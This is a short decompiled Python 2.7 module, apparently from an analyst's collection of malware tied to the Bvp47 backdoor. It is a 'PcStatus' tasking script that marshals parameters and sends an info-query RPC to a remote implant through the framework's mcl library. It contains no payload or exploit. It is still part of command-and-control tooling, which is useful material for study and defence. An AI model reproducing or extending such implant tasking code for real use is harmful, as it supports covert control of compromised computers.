# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: Mcl_Cmd_PcStatus_Tasking.py


def TaskingMain(namespace):
    import mcl.imports, mcl.target, mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.pcstatus', globals())
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.pcstatus.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = pc.cmd.pcstatus.Params()
    tgtParams.id = lpParams['id']
    if lpParams['name'] != None:
        tgtParams.name = lpParams['name']
    rpc = pc.cmd.pcstatus.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, pc.cmd.pcstatus.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\Tasking\Mcl_Cmd_PcStatus_Tasking.pyo
